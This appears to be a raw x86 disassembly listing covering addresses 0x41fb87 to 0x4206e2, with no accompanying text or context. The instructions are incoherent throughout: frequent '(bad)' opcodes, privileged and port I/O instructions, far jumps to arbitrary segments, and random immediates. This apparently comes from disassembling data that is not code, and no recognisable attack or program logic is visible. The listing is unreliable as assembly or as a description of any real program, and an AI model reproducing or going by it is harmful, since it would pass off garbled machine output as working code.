  41fb87:	inc    esi
  41fb88:	mov    ds:0xe9df1a54,al
  41fb8d:	into   
  41fb8e:	mov    ebp,0xfa0be124
  41fb93:	test   DWORD PTR [esi],esp
  41fb95:	sbb    al,0x7b
  41fb97:	xchg   BYTE PTR [edx-0x54],ah
  41fb9a:	jnp    0x41fba3
  41fb9c:	enter  0xfcb4,0xfd
  41fba0:	mov    ecx,0x6f8c3826
  41fba5:	lea    ebx,[edi+0x64d713aa]
  41fbab:	jmp    0xbab5:0xcd2770bb
  41fbb2:	ds mov ch,0x54
  41fbb5:	(bad)  
  41fbb6:	cs in  eax,dx
  41fbb8:	scas   eax,DWORD PTR es:[edi]
  41fbb9:	xchg   bl,dh
  41fbbb:	jnp    0x41fc0f
  41fbbd:	jae    0x41fba5
  41fbbf:	imul   ebx,eax,0x91
	...
  41fc31:	add    BYTE PTR [eax],al
  41fc33:	add    BYTE PTR [ecx-0xf],al
  41fc36:	(bad)
  41fc39:	hlt    
  41fc3a:	gs icebp 
  41fc3c:	push   edx
  41fc3d:	sub    eax,0x76db8ad2
  41fc42:	arpl   WORD PTR [eax+0x15504],si
  41fc48:	test   BYTE PTR [eax],0x0
  41fc4b:	add    BYTE PTR [esi+0x3cf809ee],al
  41fc51:	dec    esp
  41fc52:	pop    ecx
  41fc53:	pop    ds
  41fc54:	sbb    DWORD PTR [esi-0xf],ebx
  41fc57:	(bad)
  41fc5a:	add    BYTE PTR ds:0xfe97027,ah
  41fc60:	mov    cl,0x5e
  41fc62:	stc    
  41fc63:	xchg   esi,eax
  41fc64:	dec    eax
  41fc65:	sub    ah,BYTE PTR [ebp-0x9e0105]
  41fc6b:	dec    ebp
  41fc6c:	stos   DWORD PTR es:[edi],eax
  41fc6d:	dec    esi
  41fc6e:	jle    0x41fc40
  41fc70:	gs cli 
  41fc72:	dec    esp
  41fc73:	mov    ah,0x46
  41fc75:	inc    ecx
  41fc76:	fiadd  WORD PTR [ebx+ebp*8+0xf]
  41fc7a:	or     DWORD PTR [ebx-0x1e],edx
  41fc7d:	or     eax,0x52dea598
  41fc82:	push   ss
  41fc83:	out    dx,eax
  41fc84:	pop    ebp
  41fc85:	sbb    esp,DWORD PTR [edi-0x3d]
  41fc88:	pop    ss
  41fc89:	sar    BYTE PTR [edi-0x61],cl
  41fc8c:	retf   
  41fc8d:	jns    0x41fc25
  41fc8f:	push   ds
  41fc90:	sbb    eax,0x1605c115
  41fc95:	inc    eax
  41fc96:	push   ecx
  41fc97:	ret    
  41fc98:	and    eax,esp
  41fc9a:	mov    ebp,0x4244abc5
  41fc9f:	or     eax,0x6bcaeb81
  41fca4:	adc    DWORD PTR [eax+0xf],ebp
  41fca7:	mov    eax,ds:0xa8a40b61
  41fcac:	mov    esi,0x239137f9
  41fcb1:	ret    0x48f0
  41fcb4:	add    eax,0xb900e42c
  41fcb9:	popa   
  41fcba:	jne    0x41fc7e
  41fcbc:	pop    edx
  41fcbd:	sbb    bl,cl
  41fcbf:	loop   0x41fc82
  41fcc1:	xor    BYTE PTR [ebx+0x6249a046],bh
  41fcc7:	sahf   
  41fcc8:	mov    BYTE PTR [edx],bl
  41fcca:	xor    ch,BYTE PTR [edi]
  41fccc:	xchg   edx,eax
  41fccd:	mov    al,ch
  41fccf:	mov    ebp,0x98ea2688
  41fcd4:	imul   esi,edx,0xd0646d7b
  41fcda:	sub    al,dh
  41fcdc:	or     al,0x72
  41fcde:	cld    
  41fcdf:	call   0x586295fc
  41fce4:	shl    ch,1
  41fce6:	mov    edx,0x781a24ae
  41fceb:	sub    BYTE PTR [eax],0x8e
  41fcee:	xchg   ebx,eax
  41fcef:	cmp    eax,0x47fc95c7
  41fcf4:	ja     0x41fca4
  41fcf6:	test   edi,esp
  41fcf8:	mov    ebx,DWORD PTR [edi+0x7c]
  41fcfb:	or     bh,BYTE PTR [eax-0x50589c08]
  41fd01:	lods   al,BYTE PTR ds:[esi]
  41fd02:	sahf   
  41fd03:	jmp    FWORD PTR [esi-0x57]
  41fd06:	ret    
  41fd07:	sbb    DWORD PTR [edi],edi
  41fd09:	ret    0xc16
  41fd0c:	mov    esp,0x4f5a169e
  41fd11:	xor    edx,esi
  41fd13:	leave  
  41fd14:	popa   
  41fd15:	sub    eax,0x79542187
  41fd1a:	dec    ecx
  41fd1b:	push   ebp
  41fd1c:	in     eax,0x5b
  41fd1e:	mov    ch,0x72
  41fd20:	sbb    eax,0x3b3104a6
  41fd25:	popf   
  41fd26:	xor    esp,ecx
  41fd28:	jae    0x41fd32
  41fd2a:	and    esp,DWORD PTR [ebx+0x16]
  41fd2d:	pop    ebx
  41fd2e:	rcl    BYTE PTR [ebp-0x2a],1
  41fd31:	std    
  41fd32:	and    DWORD PTR [ebp+0x681b5c78],edx
  41fd38:	pop    ds
  41fd39:	push   ebp
  41fd3a:	fcmovnb st,st(5)
  41fd3c:	ret    0xfc57
  41fd3f:	popa   
  41fd40:	inc    esp
  41fd41:	outs   dx,BYTE PTR ds:[esi]
	...
  41fdb2:	add    BYTE PTR [eax],al
  41fdb4:	add    eax,0x7b197956
  41fdb9:	aas    
  41fdba:	gs pop esi
  41fdbc:	repnz lahf 
  41fdbe:	and    al,0x2d
  41fdc0:	rcr    cl,cl
  41fdc2:	adc    DWORD PTR [ebp+0x155fa],ebx
  41fdc8:	test   BYTE PTR [eax],0x0
  41fdcb:	add    BYTE PTR [esp+edx*2+0x7b4c844e],bl
  41fdd2:	out    dx,al
  41fdd3:	pop    edx
  41fdd4:	mov    DWORD PTR [ebp-0x28],0x51c86c3a
  41fddb:	jno    0x41fe2d
  41fddd:	xchg   esp,eax
  41fdde:	daa    
  41fddf:	jbe    0x41fdf6
  41fde1:	sbb    eax,0xdfe4f242
  41fde6:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fde8:	jmp    0x91aae449
  41fded:	stos   DWORD PTR es:[edi],eax
  41fdee:	mov    al,BYTE PTR [bx+si-0x18]
  41fdf2:	xor    BYTE PTR [ecx-0x4b],bl
  41fdf5:	and    eax,0x8bd64b07
  41fdfa:	or     bh,al
  41fdfc:	retf   
  41fdfd:	mov    edi,0xa3daecd6
  41fe02:	loope  0x41fd89
  41fe04:	je     0x41fddf
  41fe06:	xchg   bh,cl
  41fe08:	mov    al,ds:0x21fa7fa1
  41fe0d:	sti    
  41fe0e:	lds    ebp,FWORD PTR [ebp-0x2d]
  41fe11:	(bad)  
  41fe13:	test   DWORD PTR [eax+0x1bbecaf9],ebp
  41fe19:	imul   edx,ebp,0x1f9d3951
  41fe1f:	and    dl,BYTE PTR ds:0xb4239cfc
  41fe25:	pop    esp
  41fe26:	outs   dx,BYTE PTR ds:[esi]
  41fe27:	adc    al,0x71
  41fe29:	and    BYTE PTR [ecx-0x7d],al
  41fe2c:	int3   
  41fe2d:	(bad)  
  41fe2e:	push   esi
  41fe2f:	xchg   ecx,eax
  41fe30:	cli    
  41fe31:	cmp    ebx,ebx
  41fe33:	fdiv   DWORD PTR ds:0xa04c61c4
  41fe39:	sti    
  41fe3a:	and    eax,0x40cd58b6
  41fe3f:	sub    BYTE PTR [ebp+0x66],cl
  41fe42:	shr    esp,1
  41fe44:	pop    ebx
  41fe45:	xchg   esi,eax
  41fe46:	sbb    eax,0x96da3daa
  41fe4b:	pop    ds
  41fe4c:	(bad)  
  41fe4e:	in     al,0x74
  41fe50:	jo     0x41fec6
  41fe52:	mov    bh,0x86
  41fe54:	and    edx,ecx
  41fe56:	pop    es
  41fe57:	xchg   ebx,eax
  41fe58:	aaa    
  41fe59:	fstp   QWORD PTR [edx-0x51]
  41fe5c:	xchg   edi,eax
  41fe5d:	shr    BYTE PTR [ebx],cl
  41fe5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe60:	jle    0x41fe36
  41fe62:	inc    eax
  41fe63:	stc    
  41fe64:	clc    
  41fe65:	jge    0x41fe6e
  41fe67:	inc    eax
  41fe68:	loopne 0x41fe03
  41fe6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe6b:	(bad)  
  41fe6c:	cmp    dh,BYTE PTR [esi+0x5925e7b]
  41fe72:	mov    esp,0x490c0f36
  41fe77:	adc    BYTE PTR [eax+0x1662dca7],ch
  41fe7d:	fldenv [esi]
  41fe7f:	mov    bh,0xc4
  41fe81:	ror    ah,1
  41fe83:	int3   
  41fe84:	popf   
  41fe85:	pop    es
  41fe86:	cmp    esi,DWORD PTR [ebp+0x39]
  41fe89:	pop    eax
  41fe8a:	mov    ebp,0x8ced9f07
  41fe8f:	xor    BYTE PTR [eax],0xd5
  41fe92:	fucom  st(6)
  41fe94:	sbb    BYTE PTR [esi+0x38ddc542],dh
  41fe9a:	sti    
  41fe9b:	popf   
  41fe9c:	add    esp,DWORD PTR [edx-0x49]
  41fe9f:	fs jns 0x41fe2e
  41fea2:	call   0x37ec3d7e
  41fea7:	test   DWORD PTR [ebp+0xb128a0e],eax
  41fead:	minps  xmm1,XMMWORD PTR [edi+0x257d6041]
  41feb4:	mov    dl,BYTE PTR [edi]
  41feb6:	scas   al,BYTE PTR es:[edi]
  41feb7:	repnz xchg dl,al
  41feba:	les    edx,FWORD PTR [eax-0x2434d795]
  41fec0:	mov    edi,0x77
	...
  41ff31:	add    BYTE PTR [eax],al
  41ff33:	add    BYTE PTR [ecx-0xda40a3],bh
  41ff39:	out    0xbb,eax
  41ff3b:	fisttp QWORD PTR [edi+0x7]
  41ff3e:	mov    WORD PTR [edi-0x6bccd36b],?
  41ff44:	lock push esi
  41ff46:	add    DWORD PTR [eax],eax
  41ff48:	test   BYTE PTR [eax],0x0
  41ff4b:	add    BYTE PTR [ecx],dh
  41ff4d:	add    BYTE PTR [edx-0x646383ec],0x2c
  41ff54:	jns    0x41ff9f
  41ff56:	mov    esp,0x2832647c
  41ff5b:	iret   
  41ff5c:	mov    esi,0x112bcf0b
  41ff61:	mov    WORD PTR [esi+0xd],fs
  41ff64:	jnp    0x41ff51
  41ff66:	inc    edi
  41ff67:	dec    esp
  41ff68:	cmp    al,0x97
  41ff6a:	cmp    eax,0xdc3c1df
  41ff6f:	xchg   ebp,eax
  41ff70:	sti    
  41ff71:	fdiv   QWORD PTR [esi+0x23]
  41ff74:	pop    esp
  41ff75:	popa   
  41ff76:	jnp    0x41ff43
  41ff78:	loop   0x41ff68
  41ff7a:	add    eax,0x6e5147c
  41ff7f:	push   edi
  41ff80:	or     ecx,esp
  41ff82:	sub    al,0xdc
  41ff84:	dec    edi
  41ff85:	data16 xor BYTE PTR [edx],bh
  41ff88:	aaa    
  41ff89:	test   DWORD PTR [ebp-0x60],ecx
  41ff8c:	(bad)  
  41ff8d:	jae    0x41ff21
  41ff8f:	push   ds
  41ff90:	push   ebp
  41ff91:	jmp    FWORD PTR [edi-0x7b]
  41ff94:	and    al,0xef
  41ff96:	and    BYTE PTR [ebx-0x7f0b6881],0x63
  41ff9d:	popf   
  41ff9e:	xor    al,0x78
  41ffa0:	jp     0x41ffad
  41ffa2:	inc    edi
  41ffa3:	xor    ecx,esp
  41ffa5:	(bad)  
  41ffa6:	mov    al,0x26
  41ffa8:	ss aaa 
  41ffaa:	jne    0x41ff7a
  41ffac:	into   
  41ffad:	jno    0x41ff41
  41ffaf:	sbb    DWORD PTR [eax+ebx*2-0x3642350d],0x47057a30
  41ffba:	out    0x45,al
  41ffbc:	aad    0x91
  41ffbe:	jg     0x41ff66
  41ffc0:	mov    ds:0x6613f1d7,al
  41ffc5:	mov    bl,0x45
  41ffc7:	cld    
  41ffc8:	xor    eax,DWORD PTR [ecx-0x51c3bfff]
  41ffce:	(bad)  
  41ffcf:	or     BYTE PTR [edx-0x1532b739],cl
  41ffd5:	mov    DWORD PTR [esi+0x60e1277e],esp
  41ffdb:	xor    bl,bl
  41ffdd:	sti    
  41ffde:	push   bp
  41ffe0:	mov    al,ds:0x1d650a6e
  41ffe5:	push   ss
  41ffe6:	cmp    DWORD PTR [edx-0x9],0x98bea9b0
  41ffed:	xor    eax,0xecac96ff
  41fff2:	mov    eax,ds:0xb8a44fa5
  41fff7:	and    al,cl
  41fff9:	rcr    ebx,1
  41fffb:	jl     0x420048
  41fffd:	sbb    ecx,edi
  41ffff:	out    dx,al
  420000:	call   0xc2f7:0x51e66f37
  420007:	mov    eax,ds:0x5b7ebc6a
  42000c:	gs jmp 0x41fffd
  42000f:	rol    BYTE PTR [eax+0x53],0x90
  420013:	mov    edi,0x595ed934
  420018:	jae    0x42005e
  42001a:	push   cs
  42001b:	push   esp
  42001c:	add    BYTE PTR [esi],0x93
  42001f:	ins    BYTE PTR es:[edi],dx
  420020:	xchg   esp,eax
  420021:	dec    ebp
  420022:	pop    es
  420023:	dec    ebp
  420024:	fcmovb st,st(5)
  420026:	push   esp
  420027:	pop    ebp
  420028:	jmp    0xd99a:0xde1b0a15
  42002f:	or     ebx,DWORD PTR [eax]
  420031:	inc    edi
  420032:	sbb    edi,ebx
  420034:	jmp    0x420006
  420036:	out    0x4c,eax
  420038:	inc    ecx
  420039:	jle    0x420062
  42003b:	hlt    
  42003c:	and    DWORD PTR [esi-0x5a1e4111],eax
	...
  4200b2:	add    BYTE PTR [eax],al
  4200b4:	fild   QWORD PTR [edx+ebp*1+0x6c]
  4200b9:	mov    ebx,0xe891ffdf
  4200be:	arpl   WORD PTR [eax+0x7ffe1b7d],ax
  4200c4:	out    0x57,al
  4200c6:	add    DWORD PTR [eax],eax
  4200c8:	test   BYTE PTR [eax],0x0
  4200cb:	add    BYTE PTR [edi+edi*1-0x9],al
  4200cf:	ror    DWORD PTR ds:0x9b756f29,1
  4200d5:	jns    0x420081
  4200d7:	scas   eax,DWORD PTR es:[edi]
  4200d8:	xor    BYTE PTR [ebx],dl
  4200da:	mov    eax,ds:0x24f582a3
  4200df:	(bad)  
  4200e0:	leave  
  4200e1:	sub    BYTE PTR ds:0x8c9eccf2,cl
  4200e7:	sbb    BYTE PTR [ebx-0x2766c4a3],dh
  4200ed:	retf   0xea1
  4200f0:	adc    BYTE PTR [ecx-0x38],ah
  4200f3:	das    
  4200f4:	cmc    
  4200f5:	ror    DWORD PTR [edi-0x33],cl
  4200f8:	push   0x97e817bd
  4200fd:	cmp    bh,dl
  4200ff:	fimul  DWORD PTR [edi]
  420101:	sub    DWORD PTR [ecx+0x7f63705],esp
  420107:	fmul   st,st(4)
  420109:	or     al,bl
  42010b:	daa    
  42010c:	sub    esp,ebx
  42010e:	jnp    0x42016e
  420110:	ret    
  420111:	imul   edx,DWORD PTR [ebp+0x21],0x34d39004
  420118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420119:	xchg   esp,eax
  42011a:	ret    0xe406
  42011d:	push   cs
  42011e:	out    dx,eax
  42011f:	cwde   
  420120:	sbb    ch,BYTE PTR [edi]
  420122:	adc    al,BYTE PTR [ebx+0x5d351f20]
  420128:	and    edi,DWORD PTR ds:0xff8336c7
  42012e:	jns    0x420112
  420130:	in     al,dx
  420131:	dec    esp
  420132:	retf   
  420133:	jo     0x42010d
  420135:	add    ebx,esi
  420137:	in     eax,0xc0
  420139:	ins    BYTE PTR es:[edi],dx
  42013a:	cmp    esi,DWORD PTR [esi-0x694eef8a]
  420140:	inc    edi
  420141:	cmp    al,0xb4
  420143:	loope  0x4201bb
  420145:	fwait
  420146:	cmp    ah,BYTE PTR ds:0x54847309
  42014c:	push   0xd57fe049
  420151:	pop    ebp
  420152:	in     eax,dx
  420153:	out    0x41,eax
  420155:	mov    ecx,0x86a8c7d8
  42015a:	test   BYTE PTR [esi+0x2a],ah
  42015d:	mov    eax,ds:0x94a14e01
  420162:	loopne 0x4200f0
  420164:	pusha  
  420165:	pop    ecx
  420166:	and    esi,eax
  420168:	mov    esi,0x7f328507
  42016d:	jge    0x420165
  42016f:	or     DWORD PTR [ecx-0x4],esp
  420172:	lock mov cl,0x75
  420175:	inc    eax
  420176:	dec    edi
  420177:	push   0xb788c08e
  42017c:	adc    ecx,ebx
  42017e:	xlat   BYTE PTR ds:[ebx]
  42017f:	push   edi
  420180:	xchg   ebp,eax
  420181:	test   BYTE PTR [esi+0x12],0x8
  420185:	std    
  420186:	fdivr  DWORD PTR [ebp+0x3c1f22a9]
  42018c:	aas    
  42018d:	(bad)  
  42018e:	mov    ecx,0x1e276823
  420193:	mov    gs,WORD PTR [edi+ebp*1-0x514db602]
  42019a:	mov    ebp,0xcdfec6e1
  42019f:	gs aad 0x4f
  4201a2:	pop    esp
  4201a3:	pop    eax
  4201a4:	sbb    BYTE PTR [edi],ah
  4201a6:	call   0x886b:0xa3a0adfa
  4201ad:	jno    0x420186
  4201af:	jb     0x420222
  4201b1:	xchg   esp,eax
  4201b2:	inc    esp
  4201b3:	mov    ds:0xd7fd3e42,eax
  4201b8:	inc    edx
  4201b9:	imul   ebp,DWORD PTR [ebp+0x2c22b3a9],0x234d79
	...
  420233:	add    BYTE PTR [ecx+0x1b],dl
  420236:	jmp    DWORD PTR [esi-0x1]
  420239:	out    0xd9,al
  42023b:	aas    
  42023c:	mov    DWORD PTR ds:0x981bd010,ebx
  420242:	dec    ecx
  420243:	enter  0x58dc,0x1
  420247:	add    dh,dh
  420249:	add    BYTE PTR [eax],al
  42024b:	add    BYTE PTR [ebp+0x6fa50aae],ch
  420251:	add    ecx,0xffffffb3
  420254:	aaa    
  420255:	inc    esp
  420256:	stos   BYTE PTR es:[edi],al
  420257:	mov    WORD PTR [edi+0x636ed0fe],?
  42025d:	adc    eax,0x13fcf7d5
  420262:	cli    
  420263:	les    edi,FWORD PTR [edi]
  420265:	(bad)  
  420266:	outs   dx,DWORD PTR fs:[esi]
  420268:	mov    ds:0x4bb27715,al
  42026d:	addr16 lahf 
  42026f:	jo     0x42024a
  420271:	add    BYTE PTR [ebx+0x40],cl
  420274:	mov    WORD PTR ds:0xad97f61d,ss
  42027a:	cmp    dl,BYTE PTR [ecx-0x197caca]
  420280:	fsubr  st,st(5)
  420282:	dec    edi
  420283:	xchg   ebp,eax
  420284:	xchg   BYTE PTR [edx-0x2ac0ed10],dh
  42028a:	addr16 in eax,dx
  42028c:	shr    DWORD PTR [eax+0x25628169],1
  420292:	in     eax,0x15
  420294:	ins    DWORD PTR es:[edi],dx
  420295:	mov    eax,ds:0x5a956cd3
  42029a:	mov    esi,esp
  42029c:	xor    eax,0x200a1a95
  4202a1:	scas   eax,DWORD PTR es:[edi]
  4202a2:	(bad)  
  4202a3:	in     eax,0x74
  4202a5:	retf   
  4202a6:	out    dx,eax
  4202a7:	pop    ebx
  4202a8:	scas   al,BYTE PTR es:[edi]
  4202a9:	xor    DWORD PTR [ebx+0x5f9eae80],0xffffffcc
  4202b0:	jb     0x4202dc
  4202b2:	daa    
  4202b3:	or     BYTE PTR ss:[edx+0x73f261d],bl
  4202ba:	cmp    eax,esp
  4202bc:	ret    
  4202bd:	jnp    0x4202fe
  4202bf:	jle    0x42029b
  4202c1:	mov    al,0x99
  4202c3:	cmp    DWORD PTR [eax-0x14],edx
  4202c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202c7:	push   cs
  4202c8:	xchg   edx,eax
  4202c9:	or     dl,bh
  4202cb:	ret    
  4202cc:	popf   
  4202cd:	push   ds
  4202ce:	mov    eax,DWORD PTR [edx]
  4202d0:	jbe    0x420341
  4202d2:	dec    ebp
  4202d3:	int3   
  4202d4:	dec    esi
  4202d5:	arpl   WORD PTR [ecx],dx
  4202d7:	inc    edx
  4202d8:	call   0xda46:0x4d782fc3
  4202df:	cmp    al,0x6e
  4202e1:	cwde   
  4202e2:	stc    
  4202e3:	daa    
  4202e4:	and    bh,BYTE PTR [edx+ecx*2-0x77]
  4202e8:	mov    ah,0xe1
  4202ea:	test   al,0xac
  4202ec:	das    
  4202ed:	inc    edi
  4202ee:	mov    ecx,0xe7841e72
  4202f3:	lahf   
  4202f4:	dec    edi
  4202f5:	in     al,0x5c
  4202f7:	(bad)  
  4202f8:	in     eax,dx
  4202f9:	call   0x8a1:0x90cc90c0
  420300:	adc    BYTE PTR [ebx+0xfdd2d35],bh
  420306:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  420308:	inc    ebp
  420309:	and    BYTE PTR [ebx+0x32],ch
  42030c:	mov    ebp,DWORD PTR [edi+ebx*8]
  42030f:	lock inc ebp
  420311:	adc    edi,DWORD PTR es:[ebx-0x6d2eeb7c]
  420318:	fidivr WORD PTR [eax+0x6b9b317f]
  42031e:	pushf  
  42031f:	push   es
  420320:	mov    DWORD PTR [ecx],edi
  420322:	bound  edx,QWORD PTR [esi]
  420324:	push   ds
  420325:	adc    BYTE PTR [ebx+ebx*2],0x53
  420329:	sub    DWORD PTR [esi],ebx
  42032b:	shl    edi,1
  42032d:	imul   esi,DWORD PTR [esi],0xa5af690b
  420333:	mov    al,0xe6
  420335:	test   BYTE PTR ds:0xfcaa05bc,ah
  42033b:	add    edx,DWORD PTR [ebx+0x60]
  42033e:	fist   WORD PTR [ebp+0xc0a2]
	...
  4203b4:	cmp    al,0xe7
  4203b6:	imul   ebp,edi,0xfffffffb
  4203b9:	out    dx,eax
  4203ba:	mov    esp,0x889a5af7
  4203bf:	arpl   WORD PTR [ebx+0x4a],ax
  4203c2:	xor    ax,0x59d2
  4203c6:	add    DWORD PTR [eax],eax
  4203c8:	test   BYTE PTR [eax],0x0
  4203cb:	add    BYTE PTR [edi],cl
  4203cd:	mov    ds:0x6c86faa4,eax
  4203d2:	jmp    0x4203a5
  4203d4:	sbb    ch,BYTE PTR [esp+esi*2]
  4203d7:	popf   
  4203d8:	dec    ebp
  4203d9:	cdq    
  4203da:	mul    BYTE PTR [edx+0x38]
  4203dd:	xor    edi,ebp
  4203df:	pop    ebx
  4203e0:	rcl    DWORD PTR [ebx-0x74df538a],0xe3
  4203e7:	fimul  WORD PTR [edx]
  4203e9:	mov    eax,0x992b7fe5
  4203ee:	xchg   DWORD PTR [esi+esi*8+0x16bfffac],edx
  4203f5:	call   0x5c40:0x4ab85be0
  4203fc:	push   ebx
  4203fd:	cdq    
  4203fe:	pop    esp
  4203ff:	retf   
  420400:	push   es
  420401:	call   0xaf63:0x55df6784
  420408:	adc    DWORD PTR [esi],esi
  42040a:	inc    ebp
  42040b:	out    dx,al
  42040c:	arpl   si,dx
  42040e:	cdq    
  42040f:	jb     0x4203f6
  420411:	mov    cs,WORD PTR [ebx+eax*8-0xf]
  420415:	mov    eax,ds:0x4144e051
  42041a:	ins    DWORD PTR es:[edi],dx
  42041b:	jg     0x42039d
  42041d:	and    ch,BYTE PTR [eax]
  42041f:	mov    cl,0x6
  420421:	div    DWORD PTR [ebx+0x708be7]
  420427:	out    0xfc,al
  420429:	add    DWORD PTR [edx+esi*1],esp
  42042c:	sbb    BYTE PTR [ebx+0x32],dh
  42042f:	fmul   DWORD PTR [eax]
  420431:	ins    BYTE PTR es:[edi],dx
  420432:	jne    0x420469
  420434:	mov    ds:0xfa5e3611,al
  420439:	xchg   edi,eax
  42043a:	xor    eax,0xc79fd489
  42043f:	jno    0x42042a
  420441:	retf   
  420442:	out    0x83,eax
  420444:	jp     0x420498
  420446:	nop
  420447:	jle    0x420434
  420449:	call   0xc342b139
  42044e:	dec    ebp
  42044f:	les    ebx,FWORD PTR [eax+edx*1-0x4b]
  420453:	enter  0x6aa3,0x3a
  420457:	add    dl,cl
  420459:	out    dx,eax
  42045a:	push   edx
  42045b:	cmp    edi,DWORD PTR [ecx]
  42045d:	sub    ch,BYTE PTR [ecx-0x7d]
  420460:	adc    ch,dl
  420462:	push   es
  420463:	sbb    esi,DWORD PTR [ebp+0x53]
  420466:	adc    BYTE PTR [ebp+0x1],ah
  420469:	(bad)  
  42046a:	fst    DWORD PTR [ecx+0x126cce01]
  420470:	aaa    
  420471:	jecxz  0x420477
  420473:	rcl    DWORD PTR [edx-0xc022e11],0x39
  42047a:	(bad)  
  42047b:	fsub   QWORD PTR [eax-0x65]
  42047e:	fyl2xp1 
  420480:	sbb    DWORD PTR [ebp+0x51],esi
  420483:	push   es
  420484:	or     DWORD PTR [ebx+0x6eaa822e],ecx
  42048a:	pusha  
  42048b:	adc    esi,DWORD PTR [esp+ecx*2+0x38b857ac]
  420492:	sub    DWORD PTR [ecx+0x77],edx
  420495:	ja     0x4204b8
  420497:	mov    WORD PTR [edi-0x1c],fs
  42049a:	adc    BYTE PTR [edi],bh
  42049c:	not    BYTE PTR [ecx+0x69]
  42049f:	sbb    al,0x3
  4204a1:	jnp    0x420519
  4204a3:	xchg   ecx,eax
  4204a4:	ins    DWORD PTR es:[edi],dx
  4204a5:	inc    edi
  4204a6:	in     eax,0x71
  4204a8:	xor    ebx,DWORD PTR [ebp+0x1e4c17c1]
  4204ae:	sub    ah,ch
  4204b0:	add    edx,DWORD PTR [ecx-0x2c]
  4204b3:	dec    edx
  4204b4:	xor    dh,BYTE PTR [ebx-0x50]
  4204b7:	push   ds
  4204b8:	dec    edx
  4204b9:	shr    BYTE PTR [ebp+0x11],0x4e
  4204bd:	or     ax,WORD PTR [ebp+0x1e]
  4204c1:	mov    dl,0x0
	...
  420533:	add    BYTE PTR [eax+0x34],bh
  420536:	add    bh,bl
  420538:	dec    esi
  420539:	(bad)  
  42053a:	stc    
  42053b:	mov    bh,0x14
  42053d:	clc    
  42053e:	add    al,0xe1
  420540:	lock jmp 0x1:0x5ac87077
  420548:	test   BYTE PTR [eax],0x0
  42054b:	add    BYTE PTR [ebx],ch
  42054d:	pop    es
  42054e:	xchg   esi,eax
  42054f:	xchg   edi,eax
  420550:	ror    BYTE PTR [edx],1
  420552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420554:	iret   
  420555:	sub    bh,dh
  420557:	test   BYTE PTR [eax+0x5abb13ca],dh
  42055d:	out    0x68,eax
  42055f:	fs inc eax
  420561:	push   ecx
  420562:	cdq    
  420563:	mov    edi,0xcaca0d16
  420568:	lahf   
  420569:	cs (bad) 
  42056c:	jno    0x42052a
  42056e:	(bad)  
  42056f:	repnz lds edi,FWORD PTR [edx-0x55]
  420573:	or     eax,DWORD PTR [edx]
  420575:	dec    eax
  420576:	inc    eax
  420577:	shr    DWORD PTR [ecx+0xd09c594],1
  42057d:	rcr    BYTE PTR [ecx+ecx*2],1
  420580:	mov    eax,ds:0xefb1befd
  420585:	inc    ecx
  420586:	inc    esp
  420587:	loop   0x420559
  420589:	push   0x48
  42058b:	inc    ecx
  42058c:	and    bh,BYTE PTR [ecx-0x60]
  42058f:	sti    
  420590:	xor    eax,0x7b423128
  420595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420596:	mov    dl,0xc9
  420598:	ins    BYTE PTR es:[edi],dx
  420599:	imul   BYTE PTR [ecx-0x5c]
  42059c:	mov    eax,0x5d3ee6ba
  4205a1:	cmp    al,0x6a
  4205a3:	mov    bl,0xd7
  4205a5:	popa   
  4205a6:	pop    ss
  4205a7:	mov    ds:0xdc02a669,eax
  4205ac:	mov    al,0xe7
  4205ae:	push   esp
  4205af:	cmp    DWORD PTR [eax-0xc77ac69],edx
  4205b5:	inc    ebx
  4205b6:	and    edx,DWORD PTR [ebx]
  4205b8:	retf   0x4a15
  4205bb:	into   
  4205bc:	jns    0x4205f5
  4205be:	ds jmp 0x7900:0x4e64d325
  4205c6:	in     eax,0xb6
  4205c8:	pushf  
  4205c9:	std    
  4205ca:	adc    dl,bh
  4205cc:	mov    esi,0x4e324d20
  4205d1:	add    BYTE PTR [esi],dh
  4205d3:	(bad)  
  4205d4:	fmul   st,st(1)
  4205d6:	inc    ebx
  4205d7:	addr16 pop esi
  4205d9:	and    BYTE PTR [edx-0x50],al
  4205dc:	mov    dl,0x92
  4205de:	addr16 and eax,eax
  4205e1:	mov    ebp,0xa4b0ec80
  4205e6:	aam    0xa1
  4205e8:	xor    DWORD PTR [ebx+eax*1+0x54],esi
  4205ec:	jbe    0x42059b
  4205ee:	jb     0x4205bd
  4205f0:	jns    0x420582
  4205f2:	jb     0x42065a
  4205f4:	mov    edi,0xc05da84e
  4205f9:	xchg   BYTE PTR ds:0xba15153f,ah
  4205ff:	jb     0x420612
  420601:	or     ah,al
  420603:	std    
  420604:	rcr    DWORD PTR [edx],0xa6
  420607:	mov    dh,0xe0
  420609:	in     al,0x3d
  42060b:	das    
  42060c:	(bad)
  42060f:	loop   0x4205ce
  420611:	jae    0x420642
  420613:	test   DWORD PTR [esi+0x5c0e4997],ecx
  420619:	sub    DWORD PTR ds:0xf15c5852,edi
  42061f:	mul    DWORD PTR [ecx+edi*2+0x792effcf]
  420626:	mov    cl,0xc0
  420628:	jo     0x42064c
  42062a:	or     esp,DWORD PTR [ebp-0x356b24ac]
  420630:	neg    esi
  420632:	mov    ch,0x76
  420634:	inc    ebx
  420635:	inc    ebx
  420636:	fdiv   QWORD PTR [ebx]
  420638:	stos   DWORD PTR es:[edi],eax
  420639:	xor    ah,al
  42063b:	ficomp DWORD PTR [edi-0x767b0f5a]
  420641:	inc    eax
	...
  4206b2:	add    BYTE PTR [eax],al
  4206b4:	xchg   edx,eax
  4206b5:	cmp    al,0x23
  4206b7:	jle    0x420668
  4206b9:	jg     0x42069a
  4206bb:	cld    
  4206bc:	jo     0x4206a6
  4206be:	hlt    
  4206bf:	leave  
  4206c0:	cmp    DWORD PTR [edi],edi
  4206c2:	shl    DWORD PTR [edx-0x42],1
  4206c5:	pop    ebx
  4206c6:	add    DWORD PTR [eax],eax
  4206c8:	test   BYTE PTR [eax],0x0
  4206cb:	add    dh,cl
  4206cd:	sub    eax,0xc68a41b8
  4206d2:	mov    esi,0x967a79d2
  4206d7:	pop    ss
  4206d8:	sbb    al,0xb2
  4206da:	pop    ss
  4206db:	and    BYTE PTR [eax+0x7b217244],bh
  4206e1:	retf   
  4206e2:	push   ebp
